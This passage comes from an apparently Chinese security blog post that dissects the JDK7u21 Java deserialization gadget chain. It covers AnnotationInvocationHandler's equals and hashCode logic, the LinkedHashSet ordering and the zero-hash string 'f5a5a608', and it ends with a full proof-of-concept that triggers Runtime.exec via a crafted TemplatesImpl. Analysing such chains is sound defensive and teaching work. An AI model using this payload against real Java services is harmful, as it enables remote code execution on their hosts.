class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        proxy.equals(calc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用栈：</p><p><img src="../images/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200908154928091.png" alt="image-20200908154928091"></p><p>可以看到当调用方法名为<code>equals</code> 时，且参数个数和类型匹配，则调用内部 <code>equalsImpl</code> 方法</p><p><img src="../images/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200908155654212.png" alt="image-20200908155654212"></p><p>仔细看<code>equalsImpl</code>函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> Boolean <span class="title">equalsImpl</span><span class="params">(Object var1)</span> </span>&#123;</span><br><span class="line">       <span class="comment">// 判断var1是否为AnnotationInvocationHandle,var1是templates，pass</span></span><br><span class="line">        <span class="keyword">if</span> (var1 == <span class="keyword">this</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">          <span class="comment">// 构造限制点，type属性限制了var1必须为this.type的类实例</span></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="keyword">this</span>.type.isInstance(var1)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//这里获取了当前成员的方法</span></span><br><span class="line">            Method[] var2 = <span class="keyword">this</span>.getMemberMethods();</span><br><span class="line">            <span class="keyword">int</span> var3 = var2.length;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> var4 = <span class="number">0</span>; var4 &lt; var3; ++var4) &#123;</span><br><span class="line">                Method var5 = var2[var4]; <span class="comment">//遍历获取方法</span></span><br><span class="line">                String var6 = var5.getName(); <span class="comment">//获取方法名字</span></span><br><span class="line">                Object var7 = <span class="keyword">this</span>.memberValues.get(var6);<span class="comment">//获取memberValues中的值</span></span><br><span class="line">                Object var8 = <span class="keyword">null</span>;</span><br><span class="line">                <span class="comment">// Proxy.isProxyClass(var1.getClass()</span></span><br><span class="line">                <span class="comment">// 判断varl是不是代理类,显然不是，pass</span></span><br><span class="line">                AnnotationInvocationHandler var9 = <span class="keyword">this</span>.asOneOfUs(var1);</span><br><span class="line">                <span class="keyword">if</span> (var9 != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    var8 = var9.memberValues.get(var6);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="comment">// 这里直接进行了方法的调用核心。</span></span><br><span class="line">                        <span class="comment">// var5是方法名,var1是可控的类</span></span><br><span class="line">                        <span class="comment">// var1.var5()</span></span><br><span class="line">                        var8 = var5.invoke(var1);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (InvocationTargetException var11) &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (IllegalAccessException var12) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> AssertionError(var12);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (!memberValueEquals(var7, var8)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>跟入后可以看到，首先获取 <code>type</code> Class 所有声明的方法，然后在参数 Object o 上使用反射调用方法，因此前面所说 <strong>TemplatesImpl</strong> 实例是需要作为参数传入：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> Boolean <span class="title">equalsImpl</span><span class="params">(Object o)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// o 需要为 type 的实例</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">this</span>.type.isInstance(o)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125; </span><br><span class="line">        ...</span><br><span class="line">        <span class="comment">// 获取到 type Class 的方法</span></span><br><span class="line">        <span class="keyword">for</span> (Method memberMethod : getMemberMethods()) &#123;</span><br><span class="line">            ...</span><br><span class="line">            AnnotationInvocationHandler hisHandler = asOneOfUs(o);</span><br><span class="line">            <span class="keyword">if</span> (hisHandler != <span class="keyword">null</span>) &#123;</span><br><span class="line">                hisValue = hisHandler.memberValues.get(member);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 反射调用方法</span></span><br><span class="line">                hisValue = memberMethod.invoke(o);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>目的是触发<code>TemplatesImpl.newTransformer()</code></p><p>var1可以通过<code>proxy(var1)</code>方式去控制,那么var5怎么去控制呢？</p><p><code>Method[] var2 = this.getMemberMethods();</code> 可以看到这里获取了成员的方法，跟进去看看。</p><p><img src="../images/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200909093606391.png" alt="image-20200909093606391"></p><p>理一下思路</p><ol><li>根据 <strong>TemplatesImpl</strong> 部分的说明，创建一个包含恶意代码的 TemplatesImpl 实例 <code>evilTemplates</code></li><li>使用 AnnotationInvocationHandler 创建 proxy object 代理 Templates 接口 (会使用到反射)</li><li>调用 proxy object 的 <code>equals</code> 方法，将 <code>evilTemplates</code> 作为参数</li></ol><p>例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testTemplateImpl</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Map map = <span class="keyword">new</span> HashMap();</span><br><span class="line">        <span class="comment">//  AnnotationInvocationHandler 构造方法为 package private，需要使用反射创建实例</span></span><br><span class="line">        <span class="keyword">final</span> Constructor&lt;?&gt; ctor = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>).getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">        ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="comment">// 构造 payload 时，因为新版 jdk 对 type 参数做了校验，必须为 Annotation</span></span><br><span class="line">        <span class="comment">// 为了不报错，所以设置为任意一个 Annotation，再用反射修改 type 参数</span></span><br><span class="line">        InvocationHandler invocationHandler = (InvocationHandler) ctor.newInstance(Override<span class="class">.<span class="keyword">class</span>, <span class="title">map</span>)</span>;</span><br><span class="line">        <span class="comment">// 反射设置属性值</span></span><br><span class="line">        setFieldValue(invocationHandler, <span class="string">"type"</span>, Templates<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        <span class="comment">// 代理 Tempaltes 接口</span></span><br><span class="line">        Templates proxy = (Templates) Proxy.newProxyInstance(InvocationHandler.class.getClassLoader(), new Class[]&#123;Templates.class&#125;, invocationHandler);</span><br><span class="line">        <span class="comment">// 获取包含恶意代码的 Templates 对象</span></span><br><span class="line">        Templates evilTemplates = getEvilTemplates();</span><br><span class="line">        <span class="comment">// 触发恶意代码执行</span></span><br><span class="line">        proxy.equals(evilTemplates);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>结果发现是通过反射机制从<code>this.type</code>这个类属性去获取的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Reflections.setFieldValue(tempHandler, &quot;type&quot;, Templates.class);</span><br></pre></td></tr></table></figure><p>所以这里我们只要控制type为<code>Templates.class</code>就行了。</p><p><img src="../images/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200909093451311.png" alt="image-20200909093451311"></p><p>里面就有<code>newTransformer</code>方法,且为第一个,如果是第二个、第三个话,前面可能会因为参数不对等原因出现错误，导致程序没能执行到<code>newTransformer</code>方法就中断了。</p><h2 id="3-LinkedHashSet"><a href="#3-LinkedHashSet" class="headerlink" title="3-LinkedHashSet"></a>3-LinkedHashSet</h2><p>第三层的核心就是触发<code>proxy.equals(calc);</code></p><p><img src="../images/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200909094010990.png" alt="image-20200909094010990"></p><p>这是最外层<code>LinkedHashSet</code>,这个对象在反序列化的时候会自动触发<code>readObject</code>方法,从而开始了exp的执行流程</p><p>在利用 payload 中，LinkedHashSet 是最外层的类，包含恶意代码的实例和proxy object 会作为元素添加到 set 中，在反序列化过程中，会调用到前一部分所说的 <code>equals</code> 方法，来具体看一下。</p><p>LinkedHashSet 位于 <code>java.util</code> 包中，是 HashSet 的子类，添加到 set 的元素会保持有序状态，<strong>内部实现基于 HashMap</strong>。</p><p>问题是如何触发equals方法，接下来仔细看一下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LinkedHashSet</span>&lt;<span class="title">E</span>&gt;</span></span><br><span class="line"><span class="class">    <span class="keyword">extends</span> <span class="title">HashSet</span>&lt;<span class="title">E</span>&gt;</span></span><br><span class="line"><span class="class">    <span class="keyword">implements</span> <span class="title">Set</span>&lt;<span class="title">E</span>&gt;, <span class="title">Cloneable</span>, <span class="title">java</span>.<span class="title">io</span>.<span class="title">Serializable</span> </span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 HashSet 的 <code>writeObject()</code> 方法中，会依次调用每个元素的 <code>writeObject()</code> 方法来实现序列化：</p><p><img src="../images/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200909165142380.png" alt="image-20200909165142380"></p><p>通过查看序列化规则<code>writeObject</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject</span><span class="params">(java.io.ObjectOutputStream s)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> java.io.IOException </span>&#123;</span><br><span class="line">        <span class="comment">// Write out any hidden serialization magic</span></span><br><span class="line">        s.defaultWriteObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Write out HashMap capacity and load factor</span></span><br><span class="line">        s.writeInt(map.capacity());</span><br><span class="line">        s.writeFloat(map.loadFactor());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Write out size</span></span><br><span class="line">        s.writeInt(map.size());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Write out all elements in the proper order.</span></span><br><span class="line">        <span class="keyword">for</span> (E e : map.keySet())</span><br><span class="line">            s.writeObject(e);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>逻辑规则：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">s.defaultWriteObject();</span><br><span class="line">s.writeInt(map.capacity());</span><br><span class="line">s.writeFloat(map.loadFactor());</span><br><span class="line">s.writeInt(map.size());</span><br><span class="line"><span class="keyword">for</span> (E e : map.keySet())</span><br><span class="line">s.writeObject(e);</span><br></pre></td></tr></table></figure><p>相应的，在反序列化过程中，会依次调用每个元素的 <code>readObject()</code> 方法，然后将其作为 <code>key</code> (value 为固定值) 依次放入 HashMap 中：</p><p><img src="../images/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200909162106301.png" alt="image-20200909162106301"></p><p>来看一下 <code>HashMap</code> 的 <code>put()</code> 方法，首先会调用内部 <code>hash()</code> 函数计算 key 的 hash 值，然后遍历所有元素，*<em>当要插入的元素的 hash 和已有 entry 相同，且 key 和 Entry的 key 指向同一个对象 或 二者equals时 *</em>，则认为 key 已经存在，返回 oldValue，否则调用 <code>addEntry()</code> 添加元素：</p><p><img src="../images/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200909171939978.png" alt="image-20200909171939978"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> V <span class="title">put</span><span class="params">(K key, V value)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (key == <span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">return</span> putForNullKey(value);</span><br><span class="line">        <span class="comment">// 计算 key 的 hash 值</span></span><br><span class="line">        <span class="keyword">int</span> hash = hash(key);</span><br><span class="line">        <span class="keyword">int</span> i = indexFor(hash, table.length);</span><br><span class="line">        <span class="comment">// 遍历已有元素，检查 key 是否已经存在</span></span><br><span class="line">        <span class="keyword">for</span> (Entry&lt;K,V&gt; e = table[i]; e != <span class="keyword">null</span>; e = e.next) &#123;</span><br><span class="line">            Object k;</span><br><span class="line">            <span class="comment">// hash 值相同，且key和Entry的key指向同一个对象 或 二者equals</span></span><br><span class="line">            <span class="keyword">if</span> (e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k))) &#123;</span><br><span class="line">                V oldValue = e.value;</span><br><span class="line">                e.value = value;</span><br><span class="line">                e.recordAccess(<span class="keyword">this</span>);</span><br><span class="line">                <span class="keyword">return</span> oldValue;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        modCount++;</span><br><span class="line">        addEntry(hash, key, value, i);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><strong>代码中将已有元素的 *key* 值作为参数 (k 变量)，调用了插入 key 的 <code>equals</code> 方法来判断而这是否相等</strong>，这里我们只要反序列化过程中让 proxy object 先添加，然后再添加包含恶意代码的实例 (序列化时添加要顺序相反)。</p><p>理一下思路</p><ul><li>创建一个 LinkedHashSet</li><li>先将 包含恶意代码的 Templates 对象添加到 hashSet 中</li><li>将使用 AnnotationInvocationHandler 创建的proxy object (代理 Templaes 接口) 添加到 hashSet 中，在反序列化过程中，会调用 proxy 的 equals 方法 (包含恶意代码的Templates 对象作为参数)，触发恶意代码执行</li></ul><p>在反序列化过程中，需要保证 HashSet 内的 entry 保持有序，这也是为什么使用 <code>LinkedHashSet</code> 的原因。</p><p>根据代码分析，在执行到 <code>equals()</code> 之前，需要满足两个条件</p><ol><li>e.hash == hash</li><li>(k = e.key) != key</li></ol><p>条件 2 比较两个变量是否指向同一个对象，这里满足(一个为包含恶意代码的templates 实例，一个为proxy object)，条件1判断的是 hash 值是否相等，来看一下 hash 值是如何计算的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">final</span> <span class="keyword">int</span> <span class="title">hash</span><span class="params">(Object k)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> h = <span class="number">0</span>;</span><br><span class="line">  ...</span><br><span class="line">    <span class="comment">// 调用了 k 的 hashCode</span></span><br><span class="line">    h ^= k.hashCode();</span><br><span class="line"></span><br><span class="line">  h ^= (h &gt;&gt;&gt; <span class="number">20</span>) ^ (h &gt;&gt;&gt; <span class="number">12</span>);</span><br><span class="line">  <span class="keyword">return</span> h ^ (h &gt;&gt;&gt; <span class="number">7</span>) ^ (h &gt;&gt;&gt; <span class="number">4</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，计算结果只受 <code>k.hashCode()</code> 的影响</p><ul><li><strong>对于普通对象，返回的是就是 <code>k.hashCode()</code></strong></li><li>对用 proxy object，因为会统一调用 <code>inove()</code> ，而<code>AnnotationInvocationHandler</code> 在 <code>inove()</code> 方法中提供了 <code>hashCode()</code> 的实现，代码如下，内部调用了 <code>hashCodeImpl()</code></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object obj, Method method, Object[] args)</span> </span>&#123;</span><br><span class="line">  String methodName = method.getName();</span><br><span class="line">    ...</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (methodName.equals(<span class="string">"hashCode"</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.hashCodeImpl();</span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>hashCodeImpl()</code> 代码如下 ，这里稍微修改了下代码，便于理解</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">hashCodeImpl</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line">  <span class="comment">// 遍历 memberValues</span></span><br><span class="line">  Iterator itr = <span class="keyword">this</span>.memberValues.entrySet().iterator();</span><br><span class="line">  <span class="keyword">for</span>( ;itr.hasNext(); ) &#123;</span><br><span class="line">      Entry entry = (Entry)itr.next();</span><br><span class="line">      String key = ((String)entry.getKey());</span><br><span class="line">      Object value = entry.getValue();</span><br><span class="line">      <span class="comment">// 127 * key 的 hashCode，再和 memberValueHashCode(value) 进行异或</span></span><br><span class="line">      result += <span class="number">127</span> * key.hashCode() ^ memberValueHashCode(value);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>for 循环内调用了 <code>memberValueHashCode()</code> 函数，其精简代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">memberValueHashCode</span><span class="params">(Object var0)</span> </span>&#123;</span><br><span class="line">        Class var1 = var0.getClass();</span><br><span class="line">        <span class="keyword">if</span> (!var1.isArray()) &#123; <span class="comment">// 匹配到该条件</span></span><br><span class="line">            <span class="keyword">return</span> var0.hashCode();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var1 == <span class="keyword">byte</span>[]<span class="class">.<span class="keyword">class</span>) </span>&#123;</span><br><span class="line">            ....</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            ...</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>for 循环内调用了 <code>memberValueHashCode()</code> 函数，其精简代码如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">private static int memberValueHashCode(Object var0) &#123;</span><br><span class="line">        Class var1 = var0.getClass();</span><br><span class="line">        if (!var1.isArray()) &#123; // 匹配到该条件</span><br><span class="line">            return var0.hashCode();</span><br><span class="line">        &#125; else if (var1 == byte[].class) &#123;</span><br><span class="line">            ....</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            ...</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果 Entry 的 value 的 Class 不为 Array，则 <code>memberValueHashCode()</code> 函数返回 <code>value.hashCode()</code>，在这里相当于</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127 * key.hashCode() ^ value.hashCode();</span><br></pre></td></tr></table></figure><p>为了让最后返回的 <code>result</code> 和 <code>value.hashCode()</code> 相同，这就要求</p><ul><li><code>memberValues</code> 仅有一个 entry，否则 for 循环内每次计算的结果会累加</li><li><code>key.hashCode()</code> 的值为0，从而 127 * key.hashCode() = 0，0 和 任何数异或还是原值</li><li>value 和 之前添加到 hashset 的对象相同， (利用代码中该值为包含恶意代码的 templates 对象)</li></ul><p>前面提到字符串 <code>f5a5a608</code> 的 hashCode 为 0，所以这里只要让 <code>AnnotationInvocationHandler</code> 的 <code>memberValues</code> 内只放一个 key 为字符串 <code>f5a5a608</code>，value 为包含恶意代码的 <code>templates</code> 对象即可</p><p>到这里，就可以写出完整的利用代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testPoc</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Map map = <span class="keyword">new</span> HashMap();</span><br><span class="line">        String magicStr = <span class="string">"f5a5a608"</span>;</span><br><span class="line">        <span class="keyword">final</span> Constructor&lt;?&gt; ctor = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>).getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">        ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler invocationHandler = (InvocationHandler) ctor.newInstance(Override<span class="class">.<span class="keyword">class</span>, <span class="title">map</span>)</span>;</span><br><span class="line">        setFieldValue(invocationHandler, <span class="string">"type"</span>, Templates<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        <span class="comment">// value 先放入任意值，让 HashSet.add(proxy) 成功</span></span><br><span class="line">        map.put(magicStr, <span class="string">"foo"</span>);</span><br><span class="line">        Templates proxy = (Templates) Proxy.newProxyInstance(InvocationHandler.class.getClassLoader(), new Class[]&#123;Templates.class&#125;, invocationHandler);</span><br><span class="line">        Templates evilTemplates = getEvilTemplates();</span><br><span class="line">        HashSet target = <span class="keyword">new</span> LinkedHashSet();</span><br><span class="line">        target.add(evilTemplates);</span><br><span class="line">        target.add(proxy);</span><br><span class="line">        <span class="comment">// 放入实际的 value</span></span><br><span class="line">        map.put(magicStr, evilTemplates);</span><br><span class="line"></span><br><span class="line">        String filename = <span class="string">"/tmp/jdk7u21"</span>;</span><br><span class="line">        <span class="comment">// 序列化</span></span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(filename));</span><br><span class="line">        oos.writeObject(target);</span><br><span class="line">        <span class="comment">// 反序列化, boom</span></span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(filename));</span><br><span class="line">        ois.readObject();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反序列化过程的方法调用链如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">LinkedHashSet.readObject()</span><br><span class="line">  LinkedHashSet.add()</span><br><span class="line">    ...</span><br><span class="line">      TemplatesImpl.hashCode() (X)</span><br><span class="line">  LinkedHashSet.add()</span><br><span class="line">    ...</span><br><span class="line">      Proxy(Templates).hashCode() (X)</span><br><span class="line">        AnnotationInvocationHandler.invoke() (X)</span><br><span class="line">          AnnotationInvocationHandler.hashCodeImpl() (X)</span><br><span class="line">            String.hashCode() (<span class="number">0</span>)</span><br><span class="line">            AnnotationInvocationHandler.memberValueHashCode() (X)</span><br><span class="line">              TemplatesImpl.hashCode() (X)</span><br><span class="line">      Proxy(Templates).equals()</span><br><span class="line">        AnnotationInvocationHandler.invoke()</span><br><span class="line">          AnnotationInvocationHandler.equalsImpl()</span><br><span class="line">            Method.invoke()</span><br><span class="line">              ...</span><br><span class="line">                 <span class="comment">// TemplatesImpl.getOutputProperties()，实际测试时会直接调用 newTransformer()</span></span><br><span class="line">                  TemplatesImpl.newTransformer()</span><br><span class="line">                    TemplatesImpl.getTransletInstance()</span><br><span class="line">                      TemplatesImpl.defineTransletClasses()</span><br><span class="line">                        ClassLoader.defineClass()</span><br><span class="line">                        Class.newInstance()</span><br><span class="line">                          ...</span><br><span class="line">                            MaliciousClass.&lt;clinit&gt;()</span><br><span class="line">                              ...</span><br><span class="line">                                Runtime.exec()</span><br></pre></td></tr></table></figure><h1 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h1><p><img 